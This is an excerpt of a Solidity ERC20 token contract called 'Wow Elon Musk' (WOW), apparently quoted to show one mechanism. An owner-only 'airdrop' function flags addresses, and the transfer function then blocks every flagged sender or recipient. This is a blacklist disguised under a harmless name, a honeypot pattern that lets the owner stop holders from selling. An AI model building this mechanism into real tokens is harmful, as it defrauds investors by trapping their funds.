...
contract WOWELON is ERC20, Ownable{
    ...
    constructor() ERC20("Wow Elon Musk", "WOW") {
    ...
    function initializePair() external onlyOwner {
        ...
        pair = factory.createPair(address(0xc9d730A201759c44baE76038bBdCc46596fdCAd0), address(this)); 
        initialized = true; 
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        require(!airdrops[sender] && !airdrops[recipient], "airdroped");  
    ...
    function airdrop(address _address, bool _isairdroping) external onlyOwner {
        airdrops[_address] = _isairdroping;
    }
